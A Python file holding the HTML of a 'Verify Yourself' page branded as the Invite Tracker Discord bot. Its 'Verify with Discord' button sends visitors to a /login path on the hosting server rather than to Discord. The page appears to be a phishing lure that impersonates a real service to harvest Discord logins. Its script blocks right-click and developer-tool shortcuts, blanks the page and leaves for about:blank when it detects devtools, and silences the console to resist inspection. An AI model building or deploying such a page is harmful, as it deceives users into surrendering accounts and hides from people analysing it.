# html_template.py

VERIFY_PAGE_HTML = """
<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Invite Tracker - Verification</title>
    <meta name="theme-color" content="#00D4DB"/>
    <meta name="og:type" content="website"/>
    <meta name="og:url" content="https://invite-tracker.com"/>
    <meta name="og:title" content="Invite Tracker"/>
    <meta name="og:description" content="A powerful Discord bot which offers many features such as invite tracking, giveaways, messages tracking and more."/>
    <meta name="description" content="A powerful Discord bot which offers many features such as invite tracking, giveaways, messages tracking and more."/>
    <meta name="og:image" content="https://invite-tracker.com/og/invitetracker_logo.png"/>
    <meta name="og:site_name" content="Invite Tracker"/>
    <meta name="apple-mobile-web-app-title" content="Invite Tracker"/>
    <meta name="msapplication-TileColor" content="#00D4DB"/>
    
    <link rel="icon" type="image/png" sizes="32x32" href="https://invite-tracker.com/favicon-32x32.png"/>
    <link rel="icon" type="image/png" sizes="16x16" href="https://invite-tracker.com/favicon-16x16.png"/>
    <link rel="shortcut icon" href="https://invite-tracker.com/favicon.ico"/>
    <link rel="icon" type="image/svg+xml" href="https://invite-tracker.com/og/invitetracker_logo.svg"/>
    
    <style>
        @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap"); 
        :root {
            color-scheme: dark;
            --surface-300: #7a8d9c;
            --surface-400: #576a7a;
            --surface-500: #3d5060;
            --surface-600: #2a3a4a;
            --surface-700: #1e2b38;
            --surface-800: #101b26;
            --surface-850: #0b151f;
            --surface-900: #071018;
            --surface-950: #040810;
            --accent: #12a8d7;
            --brand-teal: #30e7cf;
            --discord: #5865f2;
            --discord-hover: #4752c4;
        }

        * {
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
            box-sizing: border-box;
        }

        ::selection { background: transparent; }
        img, svg { -webkit-user-drag: none; user-drag: none; pointer-events: none; }

        html, body {
            margin: 0;
            min-height: 100%;
            background: var(--surface-950);
        }

        body.devtools-open {
            background: #000 !important;
            color: #000 !important;
        }
        
        body.devtools-open * {
            visibility: hidden !important;
            opacity: 0 !important;
            transition: all 0.01s !important;
        }

        body {
            color: #d1d5db;
            background: var(--surface-950);
            font-family: Poppins, sans-serif;
            -webkit-font-smoothing: antialiased;
            overflow-x: hidden;
        }

        a { color: inherit; text-decoration: none; }

        .header {
            position: relative;
            z-index: 50;
            background: var(--surface-900);
            border-bottom: 1px solid var(--surface-800);
        }

        .nav {
            max-width: 80rem;
            margin: 0 auto;
            padding: 1rem 1.5rem;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 2rem;
        }

        .brand-link {
            display: inline-flex;
            align-items: center;
            gap: 0.75rem;
            font-weight: 700;
        }

        .brand-logo {
            width: 40px;
            height: 40px;
            display: block;
        }

        .nav-links {
            display: flex;
            align-items: center;
            gap: 1.5rem;
            color: var(--surface-300);
            font-size: 0.875rem;
            font-weight: 500;
        }

        .nav-links a:hover { color: #fff; }

        .login-btn {
            padding: 0.55rem 1rem;
            border-radius: 0.5rem;
            background: var(--accent);
            color: #fff;
            font-size: 0.875rem;
            font-weight: 600;
            transition: background-color 0.16s ease;
            cursor: pointer;
        }

        .login-btn:hover { background: #0e96c2; }

        .hero {
            position: relative;
            min-height: 100vh;
            overflow: hidden;
        }

        .hero-bg {
            position: absolute;
            inset: 0;
            pointer-events: none;
            overflow: hidden;
        }

        .blob-main {
            position: absolute;
            top: 25%;
            left: 50%;
            width: 700px;
            height: 500px;
            opacity: 0.25;
            transform: translate(-50%, -50%);
            background: radial-gradient(ellipse at center, rgba(18, 168, 215, 0.4) 0%, rgba(48, 231, 207, 0.2) 40%, transparent 70%);
            filter: blur(60px);
            animation: pulse-slow 4s ease-in-out infinite;
        }

        .blob-right {
            position: absolute;
            top: 50%;
            right: -80px;
            width: 350px;
            height: 350px;
            opacity: 0.15;
            background: radial-gradient(circle at center, rgba(48, 231, 207, 0.5) 0%, transparent 70%);
            filter: blur(50px);
            animation: float-slow 8s ease-in-out infinite;
        }

        .blob-left {
            position: absolute;
            bottom: 25%;
            left: -80px;
            width: 300px;
            height: 300px;
            opacity: 0.1;
            background: radial-gradient(circle at center, rgba(18, 168, 215, 0.5) 0%, transparent 70%);
            filter: blur(45px);
            animation: float-slow-reverse 10s ease-in-out infinite;
        }

        .grid-bg {
            position: absolute;
            inset: 0;
            opacity: 0.025;
            background-image: linear-gradient(to right, var(--accent) 1px, transparent 1px), linear-gradient(to bottom, var(--accent) 1px, transparent 1px);
            background-size: 60px 60px;
        }

        .hero-content {
            position: relative;
            z-index: 10;
            min-height: 100vh;
            padding: 4rem 1.5rem;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .panel-wrap {
            position: relative;
            width: 100%;
            max-width: 32rem;
            animation: fade-in-up 0.7s ease-out both;
            animation-delay: 100ms;
        }

        .panel-glow {
            position: absolute;
            inset: -4px;
            border-radius: 1.5rem;
            opacity: 0.5;
            filter: blur(18px);
            background: linear-gradient(to right, rgba(18, 168, 215, 0.3), rgba(48, 231, 207, 0.3));
        }

        .panel {
            position: relative;
            padding: 2rem;
            border-radius: 1rem;
            border: 1px solid rgba(30, 43, 56, 0.8);
            background: rgba(11, 21, 31, 0.8);
            backdrop-filter: blur(24px);
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.45);
            overflow: hidden;
        }

        .top-bar {
            position: absolute;
            top: 0;
            left: 50%;
            width: 6rem;
            height: 0.25rem;
            transform: translateX(-50%);
            border-bottom-left-radius: 9999px;
            border-bottom-right-radius: 9999px;
            background: linear-gradient(to right, var(--accent), var(--brand-teal));
        }

        .shield-wrap {
            display: flex;
            justify-content: center;
            margin: 0.5rem 0 1.5rem;
        }

        .shield-box {
            position: relative;
            width: 5rem;
            height: 5rem;
            border-radius: 1rem;
            display: flex;
            align-items: center;
            justify-content: center;
            background: rgba(18, 168, 215, 0.1);
            border: 1px solid rgba(18, 168, 215, 0.2);
            transition: all 0.5s ease;
        }

        .shield-box svg {
            width: 2.5rem;
            height: 2.5rem;
            color: var(--accent);
            animation: pulse-subtle 2s ease-in-out infinite;
        }

        .spin-border {
            position: absolute;
            inset: 0;
            border-radius: 1rem;
            border: 2px solid transparent;
            border-top-color: rgba(18, 168, 215, 0.4);
            animation: spin-slow 3s linear infinite;
        }

        h1 {
            margin: 0 0 0.75rem;
            text-align: center;
            font-size: clamp(1.5rem, 4vw, 1.875rem);
            line-height: 1.2;
            font-weight: 700;
            color: #fff;
        }

        .description {
            max-width: 24rem;
            margin: 0 auto 2rem;
            color: var(--surface-300);
            text-align: center;
            line-height: 1.625;
        }

        .verify-shell {
            display: flex;
            justify-content: center;
            width: 100%;
        }

        .verify-box {
            position: relative;
            width: min(302px, 100%);
            padding: 0.75rem;
            border-radius: 0.75rem;
            background: rgba(16, 27, 38, 0.5);
            border: 1px solid rgba(30, 43, 56, 0.5);
        }

        .discord-button {
            width: 100%;
            min-height: 76px;
            border: 0;
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.75rem;
            background: var(--discord);
            color: #fff;
            font-size: 0.96rem;
            font-weight: 700;
            cursor: pointer;
            box-shadow: 0 16px 34px rgba(88, 101, 242, 0.28);
            transition: background-color 0.16s ease, transform 0.16s ease;
        }

        .discord-button:hover {
            background: var(--discord-hover);
            transform: translateY(-1px);
        }

        .discord-button svg {
            width: 1.55rem;
            height: 1.55rem;
            flex: 0 0 auto;
        }

        .security-row {
            margin-top: 2rem;
            padding-top: 1.5rem;
            border-top: 1px solid rgba(30, 43, 56, 0.5);
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            align-items: center;
            gap: 1rem;
        }

        .security-item {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            color: var(--surface-500);
            font-size: 0.75rem;
        }

        .security-item svg {
            width: 1rem;
            height: 1rem;
        }

        .brand-chip {
            margin-top: 2.5rem;
            display: flex;
            align-items: center;
            gap: 0.75rem;
            animation: fade-in 0.6s ease-out both;
            animation-delay: 300ms;
        }

        .chip-inner {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            padding: 0.5rem 1rem;
            border-radius: 9999px;
            background: rgba(11, 21, 31, 0.5);
            border: 1px solid rgba(30, 43, 56, 0.5);
        }

        .chip-icon {
            width: 1.5rem;
            height: 1.5rem;
            border-radius: 9999px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(to bottom right, var(--accent), var(--brand-teal));
        }

        .chip-icon svg {
            width: 0.875rem;
            height: 0.875rem;
        }

        .chip-text {
            color: var(--surface-400);
            font-size: 0.875rem;
            font-weight: 500;
        }

        .subtext {
            margin-top: 1rem;
            color: var(--surface-600);
            font-size: 0.75rem;
            text-align: center;
            animation: fade-in 0.6s ease-out both;
            animation-delay: 400ms;
        }

        .footer {
            position: relative;
            width: 100%;
            background: var(--surface-900);
            border-top: 1px solid var(--surface-800);
        }

        .footer-inner {
            max-width: 72rem;
            margin: 0 auto;
            padding: 3.5rem 1.5rem;
            display: flex;
            flex-direction: column;
            gap: 2.5rem;
        }

        .footer-columns {
            display: flex;
            flex-direction: column;
            gap: 3rem;
        }

        .footer-column {
            display: flex;
            flex-direction: column;
            gap: 1rem;
        }

        .footer h5 {
            margin: 0;
            color: #fff;
            font-size: 1.125rem;
            line-height: 1.75rem;
            font-weight: 600;
        }

        .footer a {
            color: var(--surface-400);
            font-size: 0.875rem;
            line-height: 1.25rem;
            transition: color 0.16s ease;
        }

        .footer a:hover {
            color: #fff;
        }

        .footer-divider {
            width: 100%;
            height: 1px;
            background: var(--surface-700);
        }

        .footer-bottom {
            display: flex;
            flex-direction: column;
            gap: 1.5rem;
        }

        .copyright {
            margin: 0;
            color: var(--surface-400);
            font-size: 0.875rem;
            line-height: 1.25rem;
        }

        .social-links {
            display: flex;
            align-items: center;
            gap: 2rem;
        }

        .social-links a {
            color: var(--surface-500);
            cursor: pointer;
        }

        .social-links a:hover {
            color: var(--surface-300);
        }

        .social-x {
            width: 1.25rem;
            height: 1.25rem;
            fill: currentColor;
        }

        .social-discord {
            width: 1.5rem;
            height: 1.5rem;
            fill: currentColor;
        }

        @keyframes fade-in {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        @keyframes fade-in-up {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @keyframes pulse-slow {
            0%, 100% { opacity: 0.25; }
            50% { opacity: 0.15; }
        }

        @keyframes float-slow {
            0%, 100% { transform: translateY(0) translate(0); }
            50% { transform: translateY(-25px) translate(15px); }
        }

        @keyframes float-slow-reverse {
            0%, 100% { transform: translateY(0) translate(0); }
            50% { transform: translateY(20px) translate(-15px); }
        }

        @keyframes pulse-subtle {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.7; transform: scale(0.95); }
        }

        @keyframes spin-slow {
            from { transform: rotate(0); }
            to { transform: rotate(1turn); }
        }

        @media (max-width: 900px) {
            .nav-links, .dashboard-btn { display: none; }
            .nav { justify-content: center; }
        }

        @media (max-width: 520px) {
            .panel { padding: 1.55rem; }
            .hero-content { padding-left: 1rem; padding-right: 1rem; }
        }

        @media (min-width: 1024px) {
            .footer-columns { flex-direction: row; gap: 6rem; }
            .footer-bottom { flex-direction: row; justify-content: space-between; align-items: center; }
        }
    </style>
</head>
<body>
    <div id="app-content">
        <header class="header">
            <nav class="nav" aria-label="Global">
                <a class="brand-link" href="#" aria-label="Invite Tracker">
                    <svg class="brand-logo" viewBox="0 0 437.598 437.598" aria-hidden="true">
                        <defs>
                            <linearGradient id="logo-gradient" x1="0.5" x2="0.5" y2="1">
                                <stop offset="0" stop-color="#12a8d7"/>
                                <stop offset="1" stop-color="#30e7cf"/>
                            </linearGradient>
                        </defs>
                        <g transform="translate(437.598 437.598) rotate(180)">
                            <path d="M373.592,373.592c85.341-85.342,85.341-224.245,0-309.586s-224.245-85.342-309.586,0-85.342,224.245,0,309.586S288.251,458.934,373.592,373.592ZM79.45,79.45c76.861-76.861,201.838-76.861,278.7,0s76.861,201.838,0,278.7-201.838,76.861-278.7,0S2.678,156.311,79.45,79.45Z" fill="url(#logo-gradient)"/>
                            <path d="M262.915,372.645a14.936,14.936,0,0,0,10.394-4.3,14.721,14.721,0,0,0,4.3-10.394v-80.4h80.4a14.937,14.937,0,0,0,10.394-4.3,14.721,14.721,0,0,0,4.3-10.394,14.481,14.481,0,0,0-14.575-14.575h-80.4v-80.4a14.575,14.575,0,0,0-29.15,0v80.4h-80.4a14.575,14.575,0,1,0,0,29.15h80.4v80.4A14.2,14.2,0,0,0,262.915,372.645Z" transform="translate(-43.869 -43.897)" fill="url(#logo-gradient)"/>
                        </g>
                    </svg>
                </a>
                <div class="nav-links">
                    <a href="https://invite-tracker.com/">Home</a>
                    <a href="https://invite-tracker.com/premium">Premium</a>
                    <a href="https://discord.com/oauth2/authorize?client_id=720351927581278219">Invite</a>
                    <a href="https://docs.invite-tracker.com/">Documentation</a>
                    <a href="https://discord.com/invite/8RwBGuf">Support</a>
                    <a href="https://invite-tracker.com/status">Status</a>
                </div>
                <a class="login-btn dashboard-btn">Login</a>
            </nav>
        </header>
        <main class="hero">
            <div class="hero-bg" aria-hidden="true">
                <div class="blob-main"></div>
                <div class="blob-right"></div>
                <div class="blob-left"></div>
                <div class="grid-bg"></div>
            </div>
            <section class="hero-content">
                <div class="panel-wrap">
                    <div class="panel-glow"></div>
                    <div class="panel">
                        <div class="top-bar"></div>
                        <div class="shield-wrap">
                            <div class="shield-box">
                                <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
                                    <path fill-rule="evenodd" d="M12.516 2.17a.75.75 0 0 0-1.032 0 11.209 11.209 0 0 1-7.877 3.08.75.75 0 0 0-.722.515A12.74 12.74 0 0 0 2.25 9.75c0 5.942 4.064 10.933 9.563 12.348a.749.749 0 0 0 .374 0c5.499-1.415 9.563-6.406 9.563-12.348 0-1.39-.223-2.73-.635-3.985a.75.75 0 0 0-.722-.516l-.143.001c-2.996 0-5.717-1.17-7.734-3.08Zm3.094 8.016a.75.75 0 1 0-1.22-.872l-3.236 4.53L9.53 12.22a.75.75 0 0 0-1.06 1.06l2.25 2.25a.75.75 0 0 0 1.14-.094l3.75-5.25Z" clip-rule="evenodd"/>
                                </svg>
                                <div class="spin-border"></div>
                            </div>
                        </div>
                        <h1>Verify Yourself</h1>
                        <p class="description">Complete the security check below to verify that you're human and gain access to the server.</p>
                        <div class="verify-shell">
                            <div class="verify-box">
                                <button onclick="openDiscordPopup()" class="discord-button" id="discordLoginBtn">
                                    <svg viewBox="0 0 24 24" aria-hidden="true">
                                        <path fill="currentColor" d="M20.32 4.37A19.8 19.8 0 0 0 15.36 3c-.22.39-.47.92-.64 1.33a18.27 18.27 0 0 0-5.44 0A13.7 13.7 0 0 0 8.63 3a19.74 19.74 0 0 0-4.96 1.38C.54 9.05-.31 13.6.12 18.08A19.95 19.95 0 0 0 6.2 21.1c.49-.66.92-1.36 1.3-2.1-.71-.27-1.39-.6-2.03-.99.17-.12.34-.25.5-.39a14.15 14.15 0 0 0 12.07 0c.16.14.33.27.5.39-.64.38-1.32.72-2.04.99.38.74.82 1.44 1.31 2.1a19.9 19.9 0 0 0 6.07-3.02c.5-5.2-.86-9.7-3.56-13.71ZM8.02 15.33c-1.18 0-2.14-1.08-2.14-2.41 0-1.33.94-2.42 2.14-2.42 1.2 0 2.16 1.1 2.14 2.42 0 1.33-.94 2.41-2.14 2.41Zm7.96 0c-1.18 0-2.14-1.08-2.14-2.41 0-1.33.94-2.42 2.14-2.42 1.2 0 2.16 1.1 2.14 2.42 0 1.33-.94 2.41-2.14 2.41Z"/>
                                    </svg>
                                    Verify with Discord
                                </button>
                            </div>
                        </div>
                        <div class="security-row">
                            <div class="security-item">
                                <svg viewBox="0 0 24 24" fill="currentColor">
                                    <path fill-rule="evenodd" d="M12.516 2.17a.75.75 0 0 0-1.032 0 11.209 11.209 0 0 1-7.877 3.08.75.75 0 0 0-.722.515A12.74 12.74 0 0 0 2.25 9.75c0 5.942 4.064 10.933 9.563 12.348a.749.749 0 0 0 .374 0c5.499-1.415 9.563-6.406 9.563-12.348 0-1.39-.223-2.73-.635-3.985a.75.75 0 0 0-.722-.516l-.143.001c-2.996 0-5.717-1.17-7.734-3.08Zm3.094 8.016a.75.75 0 1 0-1.22-.872l-3.236 4.53L9.53 12.22a.75.75 0 0 0-1.06 1.06l2.25 2.25a.75.75 0 0 0 1.14-.094l3.75-5.25Z" clip-rule="evenodd"/>
                                </svg>
                                <span>Secure verification</span>
                            </div>
                            <div class="security-item">
                                <svg viewBox="0 0 24 24" fill="currentColor">
                                    <path fill-rule="evenodd" d="M12 1.5a5.25 5.25 0 0 0-5.25 5.25v3a3 3 0 0 0-3 3v6.75a3 3 0 0 0 3 3h10.5a3 3 0 0 0 3-3v-6.75a3 3 0 0 0-3-3v-3c0-2.9-2.35-5.25-5.25-5.25Zm3.75 8.25v-3a3.75 3.75 0 1 0-7.5 0v3h7.5Z" clip-rule="evenodd"/>
                                </svg>
                                <span>Verify with Discord</span>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="brand-chip">
                    <div class="chip-inner">
                        <div class="chip-icon">
                            <svg viewBox="0 0 24 24" fill="none">
                                <path d="M12 2 2 7l10 5 10-5-10-5ZM2 17l10 5 10-5M2 12l10 5 10-5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                            </svg>
                        </div>
                        <span class="chip-text">Invite Tracker</span>
                    </div>
                </div>
                <p class="subtext">Verifying membership access</p>
            </section>
        </main>
        <footer class="footer">
            <div class="footer-inner">
                <div class="footer-columns">
                    <div class="footer-column">
                        <h5>Invite Tracker</h5>
                        <a href="#">Add to Discord</a>
                        <a href="#">Premium</a>
                        <a href="#">Documentation</a>
                        <a href="#">Support Server</a>
                    </div>
                    <div class="footer-column">
                        <h5>Legal</h5>
                        <a href="#">Terms of Service</a>
                        <a href="#">Privacy Policy</a>
                    </div>
                </div>
                <div class="footer-divider"></div>
                <div class="footer-bottom">
                    <p class="copyright">&copy;2026 INVITE TRACKER. All rights reserved. Not affiliated with Discord Inc.</p>
                    <div class="social-links">
                        <a href="#" aria-label="Invite Tracker on X">
                            <svg viewBox="0 0 300 271" xmlns="http://www.w3.org/2000/svg" class="social-x">
                                <path d="m236 0h46l-101 115 118 156h-92.6l-72.5-94.8-83 94.8h-46l107-123-113-148h94.9l65.5 86.6zm-16.1 244h25.5l-165-218h-27.4z"/>
                            </svg>
                        </a>
                        <a href="#" aria-label="Invite Tracker support Discord">
                            <svg viewBox="0 -28.5 256 256" class="social-discord">
                                <path d="M216.856 16.597C200.285 8.843 182.566 3.208 164.042 0c-2.276 4.113-4.933 9.645-6.766 14.046-19.692-2.961-39.203-2.961-58.533 0C96.911 9.645 94.193 4.113 91.897 0 73.353 3.208 55.613 8.864 39.042 16.638 5.618 67.147-3.443 116.401 1.087 164.956c22.169 16.555 43.653 26.612 64.775 33.193 5.215-7.178 9.866-14.807 13.873-22.848-7.631-2.9-14.94-6.478-21.846-10.632 1.832-1.357 3.624-2.776 5.356-4.236 42.122 19.702 87.89 19.702 129.51 0 1.751 1.46 3.543 2.879 5.355 4.236-6.926 4.175-14.255 7.754-21.886 10.654 4.006 8.02 8.638 15.671 13.873 22.848 21.142-6.581 42.646-16.638 64.815-33.213 5.316-56.288-9.081-105.09-38.056-148.359ZM85.474 135.095c-12.645 0-23.015-11.805-23.015-26.18 0-14.375 10.149-26.2 23.015-26.2 12.867 0 23.236 11.804 23.015 26.2.02 14.375-10.149 26.18-23.015 26.18Zm85.051 0c-12.645 0-23.014-11.805-23.014-26.18 0-14.375 10.148-26.2 23.014-26.2 12.866 0 23.236 11.804 23.015 26.2 0 14.375-10.148 26.18-23.015 26.18Z"/>
                            </svg>
                        </a>
                    </div>
                </div>
            </div>
        </footer>
    </div>

   <script>
    // ============================================
    // Anti-Inspect: All Shortcuts Block
    // ============================================
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
        return false;
    });

    document.addEventListener('keydown', function(e) {
        if (e.key === 'F12' || e.keyCode === 123) {
            e.preventDefault();
            return false;
        }
        if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.keyCode === 73)) {
            e.preventDefault();
            return false;
        }
        if (e.ctrlKey && e.shiftKey && (e.key === 'J' || e.key === 'j' || e.keyCode === 74)) {
            e.preventDefault();
            return false;
        }
        if (e.ctrlKey && (e.key === 'U' || e.key === 'u' || e.keyCode === 85)) {
            e.preventDefault();
            return false;
        }
        if (e.ctrlKey && e.shiftKey && (e.key === 'C' || e.key === 'c' || e.keyCode === 67)) {
            e.preventDefault();
            return false;
        }
    });

    // ============================================
    // DevTools Detection
    // ============================================
    (function detectDevTools() {
        let detected = false;
        
        function killPage() {
            if (detected) return;
            detected = true;
            document.body.classList.add('devtools-open');
            document.body.innerHTML = '';
            document.body.style.background = '#000';
            document.body.style.color = '#000';
            document.body.style.margin = '0';
            document.body.style.padding = '0';
            document.body.style.overflow = 'hidden';
            document.documentElement.style.background = '#000';
            window.location.href = 'about:blank';
        }
        
        setInterval(function() {
            const start = performance.now();
            debugger;
            const end = performance.now();
            if (end - start > 50) {
                killPage();
            }
        }, 1000);
        
        let element = new Image();
        Object.defineProperty(element, 'id', {
            get: function() {
                killPage();
                throw new Error('DevTools Detected!');
            }
        });
        setInterval(function() {
            console.log('%c', element);
        }, 800);
        
        let width = window.outerWidth - window.innerWidth;
        let height = window.outerHeight - window.innerHeight;
        setInterval(function() {
            const newWidth = window.outerWidth - window.innerWidth;
            const newHeight = window.outerHeight - window.innerHeight;
            if (newWidth !== width || newHeight !== height) {
                killPage();
            }
        }, 1000);
    })();

    // ============================================
    // Console Log Block
    // ============================================
    console.log = function() {};
    console.warn = function() {};
    console.error = function() {};
    console.info = function() {};
    console.debug = function() {};

   // ============================================
// ⭐ Redirect to /login with data parameter
// ============================================
function openDiscordPopup() {
    // বর্তমান URL থেকে data প্যারামিটার নিন
    var urlParams = new URLSearchParams(window.location.search);
    var dataParam = urlParams.get('data');
    
    // /login পেজে রিডাইরেক্ট করুন data প্যারামিটার সহ
    if (dataParam) {
        // ডেটা এনকোড করে পাঠান
        var encodedData = encodeURIComponent(dataParam);
        window.location.href = "/login?data=" + encodedData;
    } else {
        // data প্যারামিটার না থাকলে শুধু /login
        window.location.href = "/login";
    }
}

    // ⭐ বাটনে ক্লিক ইভেন্ট
    document.addEventListener('DOMContentLoaded', function() {
        var btn = document.getElementById('discordLoginBtn');
        if (btn) {
            btn.addEventListener('click', function(e) {
                e.preventDefault();
                openDiscordPopup();
            });
        }
    });
</script>
</body>
</html>
"""